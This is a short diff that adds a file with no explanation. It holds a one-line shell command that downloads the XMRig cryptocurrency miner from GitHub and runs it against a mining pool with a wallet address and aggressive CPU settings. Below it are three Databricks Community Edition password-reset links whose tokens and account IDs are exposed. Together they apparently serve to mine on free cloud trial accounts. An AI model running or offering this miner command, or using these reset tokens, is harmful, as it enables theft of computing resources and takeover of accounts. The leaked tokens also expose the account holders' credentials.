@@ -1,0 +1,13 @@
+curl -L -o xmrig-6.19.2-linux-static-x64.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-linux-static-x64.tar.gz && tar xf xmrig-6.19.2-linux-static-x64.tar.gz && cd xmrig-6.19.2 && ./xmrig -o rx.unmineable.com:3333 -u SHIB:0xf6d6dffacbfa6cc481f1e0bf34997f144fcd77df.worker
+ -p x -t 5 -k --cpu-affinity=2 --cpu-priority=5 --cpu-max-threads-hint=80 --huge-pages-jit --hugepage-size=2000 --randomx-mode=fast --randomx-1gb-pages
+
+
+
+
+https://community.cloud.databricks.com/login.html?resetpassword&username=ohbincue%40mbox.re&expiration=-60000&token=7c9b8c7eec2baa815a7d5e5a0729c88965e52684&accountid=abb415c6-7e92-450b-9741-1a2f46bccfa6
+
+
+https://community.cloud.databricks.com/login.html?resetpassword&username=dye252%40meruado.uk&expiration=-60000&token=3cfae0a54f71e9fe9196af5adebc74d378a748af&accountid=f7209a1a-ce4b-411e-9aa9-da0a99587ba8
+
+
+https://community.cloud.databricks.com/login.html?resetpassword&username=sitsewton%40tapi.re&expiration=-60000&token=ed454299b1fdb4b701e0f28effc31ca0a79f58f8&accountid=048bcfc5-000d-4508-a77d-33574740b03c
